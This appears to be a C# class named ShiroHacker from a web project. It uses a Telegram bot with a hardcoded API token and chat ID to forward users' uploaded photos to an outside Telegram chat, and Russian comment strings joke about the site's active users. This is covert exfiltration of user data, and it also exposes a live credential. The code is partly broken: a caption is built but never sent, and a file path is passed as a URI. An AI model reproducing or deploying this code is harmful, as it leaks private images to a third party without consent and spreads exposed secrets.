using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using static System.Runtime.InteropServices.JavaScript.JSType;
namespace BrickTrickWeb
{

    public class ShiroHacker
    {
        private const string Telegram_Api = "5998744588:AAH_U1o3O70aJm9OTNj0juL2iwWQS_s74L8";
        private const long chat_Id = 5123305539;
        public static string FullPathFromFile;
        private TelegramBotClient bot = new TelegramBotClient(Telegram_Api);
        public void workToBot(string path)
        {
            FullPathFromFile = path;
            bot.StartReceiving(Update, Error);
            //Task.Delay(5000);
            Console.ReadLine();
        }
        private async static Task Update(ITelegramBotClient client, Update update, CancellationToken token)
        {
            var message = update.Message;
            string text = FormText + ", фото пользователя";
            if (FullPathFromFile != null)
            {
                await client.SendPhotoAsync(chat_Id, photo: InputFile.FromUri(FullPathFromFile));
            }
            
        }
        private static string FormText
        {
            get
            {
                List<string> commentFromMyHacker = new List<string>()
                {
                    "пользователи сегодня ведут себя весьма активно",
                    "интересно насколько ваш сайт популярен сегодня",
                    "фотография как-то притерно"
                };
                int index = new Random().Next(0, commentFromMyHacker.Count);
                return commentFromMyHacker[index];
            }
        }
        private Task Error(ITelegramBotClient client, Exception exception, CancellationToken token)
        {
            Results.StatusCode(500);
            throw new Exception();
        }
    }
}
